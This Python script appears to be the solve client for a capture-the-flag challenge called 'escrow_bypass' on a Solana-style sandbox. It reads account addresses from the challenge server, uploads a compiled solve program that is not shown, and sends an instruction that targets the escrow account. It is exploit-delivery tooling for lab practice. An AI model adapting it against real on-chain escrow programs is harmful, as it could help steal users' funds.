#!/usr/bin/env python3
import socket
import os
import re
import hashlib
import base58
import sys

HOST = os.getenv("CHALLENGE_HOST", "localhost")
PORT = int(os.getenv("CHALLENGE_PORT", "5005"))
SOLVE_PATH = "solve/target/deploy/escrow_bypass_solve.so"

def main():
    global HOST, PORT
    if len(sys.argv) > 1:
        HOST = sys.argv[1]
    if len(sys.argv) > 2:
        PORT = int(sys.argv[2])
    
    print("[*] Connecting to challenge server...")
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        print("[+] Connected!")
        
        # Read banner and challenge info
        response = b""
        while b"program pubkey:" not in response:
            chunk = s.recv(4096)
            if not chunk:
                print("[!] Server disconnected")
                return
            response += chunk
        
        banner = response.decode('utf-8', errors='ignore')
        print(banner)
        
        # Extract addresses
        user_match = re.search(r'Address:\s+(\w+)', banner)
        program_match = re.search(r'Program ID:\s+(\w+)', banner)
        escrow_match = re.search(r'Escrow PDA:\s+(\w+)', banner)
        
        if not all([user_match, program_match, escrow_match]):
            print("[!] Failed to extract addresses")
            return
        
        user_pubkey = user_match.group(1)
        program_pubkey = program_match.group(1)
        escrow_pubkey = escrow_match.group(1)
        
        print(f"\n[*] Extracted:")
        print(f"  User: {user_pubkey}")
        print(f"  Program: {program_pubkey}")
        print(f"  Escrow: {escrow_pubkey}\n")
        
        # Load solve program
        print(f"[*] Loading {SOLVE_PATH}...")
        with open(SOLVE_PATH, 'rb') as f:
            solve_data = f.read()
        
        # Generate solve program pubkey
        solve_seed = hashlib.sha256(solve_data).digest()
        solve_pubkey = base58.b58encode(solve_seed).decode('ascii')
        
        # Send solve program pubkey
        print(f"[*] Sending solve program pubkey: {solve_pubkey}")
        s.sendall(f"{solve_pubkey}\n".encode())
        
        # Wait for "program len:" prompt
        response = b""
        while b"program len:" not in response:
            chunk = s.recv(1024)
            if not chunk:
                print("[!] Server disconnected")
                return
            response += chunk
        
        # Send program length and data
        print(f"[*] Sending solve program ({len(solve_data)} bytes)")
        s.sendall(f"{len(solve_data)}\n".encode())
        s.sendall(solve_data)
        print(f"[+] Sent solve program")
        
        # Wait for instruction prompt
        response = b""
        while b"num accounts:" not in response:
            chunk = s.recv(4096)
            if not chunk:
                print("[!] Server disconnected")
                return
            response += chunk
            print(chunk.decode('utf-8', errors='ignore'), end='')
        
        # Send instruction
        print("\n[*] Sending instruction...")
        s.sendall(b"3\n")  # 3 accounts
        s.sendall(f"ws {user_pubkey}\n".encode())  # user (writable, signer)
        s.sendall(f"x {program_pubkey}\n".encode())  # escrow program (readonly)
        s.sendall(f"w {escrow_pubkey}\n".encode())  # escrow PDA (writable)
        s.sendall(b"0\n")  # no instruction data
        print("[+] Sent instruction")
        
        # Read results
        print("\n[*] Waiting for results...\n")
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            print(chunk.decode('utf-8', errors='ignore'), end='')
        
        print("\n[*] Connection closed")

if __name__ == "__main__":
    main()
